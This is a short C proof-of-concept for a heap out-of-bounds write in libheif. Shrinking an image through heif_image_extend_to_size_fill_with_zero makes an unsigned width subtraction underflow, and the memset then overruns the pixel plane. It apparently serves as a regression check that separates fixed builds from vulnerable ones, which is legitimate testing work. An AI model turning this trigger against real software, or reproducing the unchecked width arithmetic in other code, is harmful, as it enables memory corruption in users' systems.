/*
 * Proof-of-concept for a heap out-of-bounds write in
 * HeifPixelImage::extend_to_size_with_zero(), reached through the public
 * libheif C API with in-contract input.
 *
 * Driver: build an 8-bit monochrome image through heif_image_create() +
 * heif_image_add_plane(), then ask the public
 * heif_image_extend_to_size_fill_with_zero() API to resize it to a *smaller*
 * width.
 *
 * The right-edge fill in extend_to_size_with_zero() computes its per-row memset
 * length as (subsampled_width - old_width). For a target narrower than the
 * current plane that unsigned subtraction underflows to a ~4 GB value and the
 * memset writes far past the end of the pixel plane.
 *
 * On a correctly-fixed tree the request is rejected with a usage error before
 * any plane is touched and this program prints the error code and exits 0.
 * On the vulnerable tree the memset corrupts the heap and AddressSanitizer
 * aborts (SIGABRT / rc 134) before the final print is reached.
 */

#include <libheif/heif.h>

#include <stdio.h>

int main(void)
{
  const int W = 64;
  const int H = 8;

  heif_image* img = NULL;
  heif_error err = heif_image_create(W, H,
                                     heif_colorspace_monochrome,
                                     heif_chroma_monochrome,
                                     &img);
  if (err.code != heif_error_Ok || img == NULL) {
    fprintf(stderr, "heif_image_create failed: %s\n", err.message);
    return 2;
  }

  err = heif_image_add_plane(img, heif_channel_Y, W, H, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_image_add_plane failed: %s\n", err.message);
    heif_image_release(img);
    return 2;
  }

  /* Shrink the width 64 -> 1. The per-row right-edge fill length underflows
   * (1 - 64 as uint32_t) and the memset writes past the end of the Y plane. */
  err = heif_image_extend_to_size_fill_with_zero(img, 1, (uint32_t) H);

  /* Only reached on a tree that correctly rejects the shrink request. */
  fprintf(stderr, "extend_to_size_fill_with_zero returned code=%d (%s)\n",
          err.code, err.message);

  heif_image_release(img);
  return 0;
}
